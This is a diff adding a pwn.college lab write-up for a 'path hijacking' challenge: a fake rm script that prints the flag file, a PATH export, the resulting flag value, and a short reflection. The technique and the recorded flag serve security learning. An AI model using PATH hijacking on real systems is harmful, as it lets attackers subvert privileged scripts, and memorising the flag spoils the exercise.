@@ -165,16 +165,33 @@ NIL
 
 ### 
 
-**Flag:** ``
+**Flag:** `pwn.college{ISgvCwl1Y73m-ysyL2BXCsGomNS.QX3cjM1wyM3gjNzEzW}`
+
+as per the challenge, we need to prevent the code from removing the flag, but if we just use PATH="rm", it would not remove the flag, but would not show the flag.
+so we first created a fake directory named `/tmp/fake` in that we put the commands inside `/tmp/fake/rm` and then we `export PATH=/tmp/fake:$PATH`.
+to verify the right fake rm is taken, we did `which rm` which should `/tmp/fake/rm` and then did `/challenge/run` and thus got the flag.
 
 
 
 ```
-
+hacker@path~hijacking-commands:~$ mkdir -p /tmp/fake
+hacker@path~hijacking-commands:~$ echo '#!/bin/bash' > /tmp/fake/rm
+hacker@path~hijacking-commands:~$ echo 'cat "${!#}"' >> /tmp/fake/rm
+hacker@path~hijacking-commands:~$ chmod +x /tmp/fake/rm
+hacker@path~hijacking-commands:~$ export PATH=/tmp/fake:$PATH
+hacker@path~hijacking-commands:~$ which rm
+/tmp/fake/rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /tmp/fake/rm. Executing!
+pwn.college{ISgvCwl1Y73m-ysyL2BXCsGomNS.QX3cjM1wyM3gjNzEzW}
+hacker@path~hijacking-commands:~$
 
 ```
 
 ## What I learned
+
+I learned how to create fake commands, to trick the linux in removing the fake rm instead of the real one.
 
 
 ## References
